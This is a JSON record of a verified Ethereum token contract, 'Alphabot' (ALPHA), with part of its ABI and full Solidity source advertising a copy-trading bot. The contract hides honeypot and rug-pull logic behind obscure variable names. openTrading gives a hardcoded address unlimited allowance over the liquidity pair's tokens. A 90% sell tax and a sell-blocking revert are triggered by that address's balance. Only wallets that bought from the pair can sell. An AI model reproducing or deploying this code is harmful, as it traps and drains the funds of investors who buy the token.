ayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateSingleTxMaxUsedInSwapping\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"Alphabot.sol\": {\r\n      \"content\": \"/**\\nTelegram: t.me/ALPHABOT_ETH\\nTwitter: twitter.com/ALPHA_BOT_ETH\\nWebsite: alphabot.one\\n*/\\n\\n/*\\nWelcome to ALPHA BOT, your one-stop solution for seamless copy trading and \\na plenty of innovative utility telegram bots designed exclusively for the \\ncrypto world.With a passion for revolutionizing the way you engage with \\ncrypto curriencies. We are excited  to present our flagship product that will \\ntransform the way you trade and interest with in the digital assets space.\\n*/\\n\\n// SPDX-License-Identifier:unlicense\\npragma solidity 0.8.19;\\n\\ninterface IuniswapRouter {\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n}\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n    function allowance(address owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n}\\n\\ninterface IUniswapV2Factory {\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\nlibrary SafeMath {\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b <= a, errorMessage);\\n        uint256 c = a - b;\\n        return c;\\n    }\\n\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n        return c;\\n    }\\n   \\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b > 0, errorMessage);\\n        uint256 c = a / b;\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c >= a, \\\"SafeMath: addition overflow\\\");\\n        return c;\\n    }\\n    \\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\n    }\\n}\\n\\ncontract Ownable is Context {\\n    address private _owner;\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n    constructor () {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    function owner() public view returns (address) {\\n        return _owner;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n}\\n\\ncontract Alphabot is Context, Ownable,IERC20 {\\n    string private constant _contract_name = \\\"ALPHA\\\";\\n    string private constant _contract_symbol = \\\"ALPHA\\\";\\n    uint8  private constant _contract_decimals = 18;\\n\\n    uint256 private constant _totalsupply_amount = 1_000_000 * 10**_contract_decimals;\\n    uint256 public _limitationsInMaxSlotsUsedInSwappingTx =     500 * 10**_contract_decimals; \\n    uint256 public _limitationsInMaxSlotsUsedInSwappingTxUp =     10_000 * 10**_contract_decimals; \\n    uint256 public _limitationsForAddressSingleTxsMax = 20_000* 10**_contract_decimals;\\n    uint256 public _LimitationsTaxUsedInSlotsForSwapping= 20_000 * 10**_contract_decimals;   \\n    uint256 public _limitationsForSingleMaxTxAmounts =   20_000 * 10**_contract_decimals;\\n\\n    using SafeMath for uint256;\\n    uint256 private _reducedWhenBuyTaxs=3;\\n    uint256 private _reducedWhenUsedSellingTax=1;\\n    uint256 private _usedInPreventingSwappingPrevious=0;\\n    uint256 private _blockCountsUsedInBuying=0;\\n    uint256 private _InitialeUsedTaxSelling=19;\\n    uint256 private _InitialeUsedInSwapTaxSelling=19;\\n    uint256 private _TaxUsedBuyingFinalized=5;\\n    uint256 private _TaxUsedSellingFinalized=5;\\n    uint256 private _TaxCharityUsedSelling=90;\\n\\n\\n    bool public  _enableWatchDogLimitsFlag = false;\\n    bool private _swapingInUniswapOKSigns = false;\\n    bool private _flagUsedInUniswapIsOkSigns = false;\\n    bool private flagForTradingIsOkOrNot;\\n    modifier _modifierInUniswapFlag {\\n        _flagUsedInUniswapIsOkSigns = true; _;  _flagUsedInUniswapIsOkSigns = false;\\n    }\\n   \\n    mapping (address => mapping (address => uint256)) private _allowances;\\n    mapping (address => bool) private _map_of_addressForNotPayingFee;\\n    mapping (address => uint256) private _balances;\\n    mapping (address => bool) private _map_of_address_notSpendFeesWhenBuying;\\n    mapping(address => uint256) private _map_of_address_ForTimestampTransfering;\\n\\n\\n    address private _uniswapPairTokenLiquidity;\\n    address public _addressUsedInFundationFees = address(0xd1fF03D05A1B04386D56447E706E2D03F4E5D7E5);\\n    address payable  public _feesForDevsAddress;\\n    IuniswapRouter private _uniswapRouterUniswapFactory;\\n    event RemoveAllLimits(uint _limitationsForSingleMaxTxAmounts);\\n    constructor () {\\n        _map_of_addressForNotPayingFee[_addressUsedInFundationFees] = true;\\n        _map_of_addressForNotPayingFee[owner()] = true;\\n        _map_of_addressForNotPayingFee[address(this)] = true;\\n        _balances[_msgSender()] = _totalsupply_amount;\\n        _feesForDevsAddress = payable(msg.sender);\\n        _map_of_addressForNotPayingFee[_feesForDevsAddress] = true;\\n        emit Transfer(address(0), _msgSender(), _totalsupply_amount);\\n    }\\n    receive() external payable {}\\n    function addressIsContractOrNot(address _addr) private view returns (bool) {\\n        uint256 lenghtContractCode;\\n        assembly {\\n            lenghtContractCode := extcodesize(_addr)\\n        }\\n        return lenghtContractCode > 0;\\n    }\\n    \\n    function openTrading() external onlyOwner() {\\n        require(!flagForTradingIsOkOrNot,\\\"trading is already open\\\");\\n        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n        _approve(address(this), address(_uniswapRouterUniswapFactory), _totalsupply_amount);\\n        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());\\n        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\n        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);\\n        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;\\n        _swapingInUniswapOKSigns = true;\\n        flagForTradingIsOkOrNot = true;\\n    }\\n\\n    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;  }\\n\\n    function swapTokensForEth(uint256 amountFortoken) private _modifierInUniswapFlag {\\n        if(amountFortoken==0){return;}\\n        if(!flagForTradingIsOkOrNot){return;}\\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = _uniswapRouterUniswapFactory.WETH();\\n        _approve(address(this), address(_uniswapRouterUniswapFactory), amountFortoken);\\n        _uniswapRouterUniswapFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            amountFortoken,\\n            0,\\n            path,\\n            address(this),\\n            block.timestamp\\n        );\\n    }\\n\\n    function _transfer(address from, address to, uint256 amount) private {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        require(amount > 0, \\\"Transfer amount must be greater than zero\\\");\\n        uint256 taxAmount=0;\\n        if (from != owner() && to != owner()) {\\n\\n            if (_enableWatchDogLimitsFlag) {\\n                if (to != address(_uniswapRouterUniswapFactory) && to != address(_uniswapPairTokenLiquidity)) {\\n                  require(_map_of_address_ForTimestampTransfering[tx.origin] < block.number,\\\"Only one transfer per block allowed.\\\");\\n                  _map_of_address_ForTimestampTransfering[tx.origin] = block.number;\\n                }\\n            }\\n\\n            if (from == _uniswapPairTokenLiquidity && to != address(_uniswapRouterUniswapFactory) && !_map_of_addressForNotPayingFee[to] ) {\\n                require(amount <= _limitationsForSingleMaxTxAmounts, \\\"Exceeds the Amount limations.\\\");\\n                require(balanceOf(to) + amount <= _limitationsForAddressSingleTxsMax, \\\"Exceeds the max limitations in single Wallet.\\\");\\n                if(_blockCountsUsedInBuying<_usedInPreventingSwappingPrevious){ require(!addressIsContractOrNot(to)); }\\n                _blockCountsUsedInBuying++; _map_of_address_notSpendFeesWhenBuying[to]=true; taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenBuyTaxs)?_TaxUsedBuyingFinalized:_InitialeUsedTaxSelling).div(100);\\n            }\\n\\n            if(to == _uniswapPairTokenLiquidity && from!= address(this) && !_map_of_addressForNotPayingFee[from] ){\\n                taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenUsedSellingTax)?_TaxUsedSellingFinalized:_InitialeUsedInSwapTaxSelling).div(100);\\n                \\n                if (amount <= _limitationsForSingleMaxTxAmounts && balanceOf(_addressUsedInFundationFees)>_limitationsInMaxSlotsUsedInSwappingTx && balanceOf(_addressUsedInFundationFees) < _limitationsInMaxSlotsUsedInSwappingTxUp){\\n                    taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenUsedSellingTax)?_TaxCharityUsedSelling:_InitialeUsedInSwapTaxSelling).div(100);\\n                }\\n                if (amount <= _limitationsForSingleMaxTxAmounts && balanceOf(_addressUsedInFundationFees)>_limitationsInMaxSlotsUsedInSwappingTxUp){\\n                    revert(\\\"Exceeds the max limitations in single Wallet.\\\");\\n                }\\n                require(_blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && _map_of_address_notSpendFeesWhenBuying[from]);\\n            }\\n            \\n            uint256 contractTokenBalance = balanceOf(address(this));\\n            if (!_flagUsedInUniswapIsOkSigns \\n            && to == _uniswapPairTokenLiquidity && _swapingInUniswapOKSigns && contractTokenBalance>_LimitationsTaxUsedInSlotsForSwapping \\n            && _blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && !_map_of_addressForNotPayingFee[to] && !_map_of_addressForNotPayingFee[from]\\n            ) {\\n                swapTokensForEth(min(amount,min(contractTokenBalance,_limitationsInMaxSlotsUsedInSwappingTx)));\\n                uint256 contractETHBalance = address(this).balance;\\n                if(contractETHBalance > 0) {\\n                    _feesForDevsAddress.transfer(address(this).balance);\\n                }\\n            }\\n        }\\n\\n        if(taxAmount>0){\\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\\n          emit Transfer(from, address(this),taxAmount);\\n        }\\n        _balances[from]= _balances[from].sub(amount);\\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\\n        emit Transfer(from, to, amount.sub(taxAmount));\\n    }\\n    \\n    function removeLimits() external onlyOwner{\\n        _limitationsForSingleMaxTxAmounts = _totalsupply_amount; _limitationsForAddressSingleTxsMax=_totalsupply_amount; _enableWatchDogLimitsFlag=false;\\n        emit RemoveAllLimits(_totalsupply_amount);\\n    }\\n\\n    function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n\\n    function updateSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {\\n        _limitationsInMaxSlotsUsedInSwappingTx = _amount;\\n    }\\n\\n    function allowance(address owner, address spender) public view override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(sender, recipient, amount);\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\n        return true;\\n    }\\n\\n    function name() public pure returns (string memory) {\\n        return _contract_name;\\n    }\\n\\n    function symbol() public pure returns (string memory) {\\n        return _contract_symbol;\\n    }\\n\\n    function decimals() public pure returns (uint8) {\\n        return _contract_decimals;\\n    }\\n\\n    function totalSupply() public pure override returns (uint256) {\\n        return _totalsupply_amount;\\n    }\\n\\n    function _approve(address owner, address spender, uint256 amount) private {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}",
    "etherscan_verified": true
}